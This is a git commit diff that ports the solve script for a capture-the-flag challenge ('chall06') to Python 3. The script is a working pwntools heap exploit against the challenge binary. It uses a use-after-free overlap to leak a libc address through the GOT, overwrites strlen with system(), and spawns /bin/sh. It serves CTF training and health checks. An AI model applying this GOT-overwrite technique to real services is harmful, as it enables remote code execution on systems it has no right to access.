429c885d8fbc8e7d23818aad56abaf317102fa5f
Calle Svensson <calle.svensson@zeta-two.com>
2019-10-08 23:18:39 +0200

    ported chall 6 exploit

--- challenges/chall06/solve/solve.py
+++ challenges/chall06/solve/solve.py
@@ -1,93 +1,124 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 from pwn import *
 import sys
 
-LOCAL = False
-HOST  = 'challenge.pwny.racing'
+target_elf = ELF('../bin/chall6')
+
+HOST  = ''
 PORT  = 40006
 
-GOT   = 0x603038  # the address of strcpy in GOT
-LIBC  = 0x18e590  # distance from __strlen_avx2() leak to libc base
-SYS   = 0x04f440  # offset from libc base to system()
+NUM_ATTEMPTS = 5
 
 if len(sys.argv) > 1:
-	LOCAL = False
 	HOST  = sys.argv[1]
 
 if len(sys.argv) > 2:
 	PORT = sys.argv[2]
 
-def add(name, desc, alias=''):
-
-	cmd = 'add'
+def add(io, name, desc, alias=''):
+	cmd = b'add'
 	if alias:
-		cmd += ' '+alias
+		cmd += b' '+alias.encode('ascii')
 
 	io.sendline(cmd)
-	io.recvuntil('player: ')
+	io.recvuntil(b'player: ')
 	io.sendline(name)
-	io.recvuntil('desc: ')
+	io.recvuntil(b'desc: ')
 	io.sendline(desc)
 
 	io.recvuntil(' > ')
 
-def edit(alias, name, desc, score):
-
-	io.sendline('edit '+alias)
-	io.recvuntil('player: ')
-	io.sendline(name)
-	io.recvuntil('desc: ')
+def edit(io, alias, name, desc, score):
+	io.sendline(b'edit '+alias.encode('ascii'))
+	io.recvuntil(b'player: ')
+	io.sendline(name.encode('ascii'))
+	io.recvuntil(b'desc: ')
 	io.sendline(desc)
-	io.recvuntil('score: ')
-	io.sendline(str(score))
+	io.recvuntil(b'score: ')
+	io.sendline(str(score).encode('ascii'))
 
-	io.recvuntil(' > ')
+	io.recvuntil(b' > ')
 
-def delete(alias):
+def delete(io, alias):
+	io.sendline(b'del '+alias.encode('ascii'))
+	io.recvuntil(b' > ')
 
-	io.sendline('del '+alias)
+def exploit_attempt():
+	try:
+		if len(HOST) > 0:
+			io = remote(HOST, PORT, level='warn')
+			target_libc = ELF('../bin/libc.so.6')
+		else:
+			io = target_elf.process(level='warn')
+			target_libc = target_elf.libc
 
-	io.recvuntil(' > ')
+		def get_strlen_avx2(elf):
+			"""Start from strlen(), find the first address loaded into rdx which _should_ be __strlen_avx2()"""
+			strlen_offset = elf.symbols['strlen']
+			for line in elf.disasm(strlen_offset, 200).split('\n'):
+				line = ' '.join(line.split())
+				if 'lea rdx' in line:
+					return int(line.split(' # ', 1)[1], 16)
+			return False
 
-if LOCAL:
-	io = process('../chall6')
-else:
-	io = remote(HOST, PORT)
+		GOT   = target_elf.symbols['got.strlen'] # the address of strlen in GOT
+		LIBC  = get_strlen_avx2(target_libc) # distance from __strlen_avx2() leak to libc base
+		SYS   = target_libc.symbols['system'] # offset from libc base to system()
 
-# mmm ansi
-print io.recvuntil('stuff:')[:-16]
+		# mmm ansi
+		sys.stdout.write(io.recvuntil(b'stuff:')[:-16])
 
-# step 1: make sure the chunk we free is not bordering the top or bottom chunk
-add('A'*46, '0'*31, 'aa')
-add('B'*46, '1'*31, 'bb')
-add('C'*46, '2'*31, 'cc')
-add('D'*46, '3'*31, 'dd')
+		# step 1: make sure the chunk we free is not bordering the top or bottom chunk
+		add(io, 'A'*46, '0'*31, 'aa')
+		add(io, 'B'*46, '1'*31, 'bb')
+		add(io, 'C'*46, '2'*31, 'cc')
+		add(io, 'D'*46, '3'*31, 'dd')
 
-# step 2: free the third struct and string
-delete('cc')
+		# step 2: free the third struct and string
+		delete(io, 'cc')
 
-# step 3: edit the second string so it ends up where the third struct was
-edit('bb', 'B'*46, 'x'*56+p64(GOT), 234)
+		# step 3: edit the second string so it ends up where the third struct was
+		edit(io, 'bb', 'B'*46, b'x'*56 + p64(GOT), 234)
 
-# step 4: leak addresses
-io.sendline('show cc')
-io.recvuntil('desc: ')
+		# step 4: leak addresses
+		io.sendline(b'show cc')
+		io.recvuntil(b'desc: ')
 
-leak = io.recvline().strip()
-func = u64(leak+'\x00\x00')
-libc = func - LIBC
-log.info('func: 0x%012x' % func)
-log.info('libc: 0x%012x' % libc)
+		leak = io.recvline().strip()
+		func = u64(leak + b'\x00\x00')
+		libc = func - LIBC
+		log.info('Func: 0x%012x' % func)
+		log.info('Libc: 0x%012x' % libc)
 
-# step 5: overwrite strlen() pointer in GOT with system()
-edit('cc', 'C'*46, p64(libc+SYS), 234)
+		# step 5: overwrite strlen() pointer in GOT with system()
+		edit(io, 'cc', 'C'*46, p64(libc + SYS), 234)
 
-# step 6: pop shell
-io.sendline('add')
-io.recvuntil(': ')
-io.sendline('/bin/sh')
+		# step 6: pop shell
+		io.sendline(b'add')
+		io.recvuntil(b': ')
+		io.sendline(b'/bin/sh')
 
-io.sendline('id')
-log.success('shell: '+io.recvline().strip())
-io.interactive()
-io.close()
+		io.sendline(b'id')
+		id_result = io.recvline()
+		if b'uid=' in id_result:
+			log.success('shell: %s', id_result.decode('ascii').strip())
+			if not os.environ.get('HEALTH_CHECK', False):
+				io.interactive()
+			sys.exit(0)
+		else:
+			log.failure('Error: %s', id_result)
+			sys.exit(1)
+	except EOFError as e:
+		log.failure('Fail: EOF')
+	except Exception as e:
+		log.failure('Error: %s: %s', type(e), str(e))
+	finally:
+		io.close()
+	return False
+
+if __name__ == '__main__':
+	for _ in range(NUM_ATTEMPTS):
+		if exploit_attempt():
+			sys.exit(0)
+		sleep(0.1)
+	sys.exit(1)
